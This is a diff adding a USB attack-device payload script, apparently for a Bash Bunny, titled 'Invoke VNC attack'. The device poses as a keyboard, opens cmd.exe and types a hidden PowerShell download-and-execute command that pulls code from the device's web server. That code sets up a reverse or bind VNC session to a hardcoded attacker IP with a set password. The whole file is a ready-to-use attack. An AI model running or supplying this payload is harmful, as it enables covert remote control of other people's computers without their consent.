@@ -1,0 +1,45 @@
+#!/bin/bash
+#
+# Title: Invoke VNC attack
+# Author: El3ct71k, (Nimrod Levy, Scorpiones)
+# Version: 1.0
+#
+# Invoke-Vnc executes a VNC agent in-memory and initiates a reverse connection, or binds to a specified port. Password authentication is supported.
+LED SETUP
+ATTACKMODE HID
+
+GET SWITCH_POSITION
+GET HOST_IP
+ATTACKER_IP=172.16.109.130
+VNC_PASS=P@ssw0rd
+PORT=5500
+ATTACK_TYPE=reverse # reverse or bind
+
+
+ATTACKMODE HID
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+rm -fr EOF
+# server.py can now instant bind sockets
+LED STAGE1
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python server.py &
+
+if [ "$ATTACK_TYPE" == "bind" ]; then
+    URL="http://$HOST_IP/?attack_type=bind&port=$PORT&password=$VNC_PASS"
+else
+    URL="http://$HOST_IP/?attack_type=reverse&port=$PORT&attacker_ip=$ATTACKER_IP&password=$VNC_PASS"
+fi
+
+RUN WIN "cmd.exe"
+QUACK DELAY 2000
+QUACK STRING "powershell -WindowStyle hidden \"while (\$true) { try { IEX(New-Object Net.WebClient).DownloadString('$URL'); exit } catch { Start-sleep -s 1 } }\""
+QUACK ENTER
+
+LED SPECIAL4
+
+ATTACKMODE RNDIS_ETHERNET
+
+LED ATTACK
+while [ ! -e  "/root/udisk/payloads/$SWITCH_POSITION/EOF" ]; do sleep 1; done;
+LED FINISH
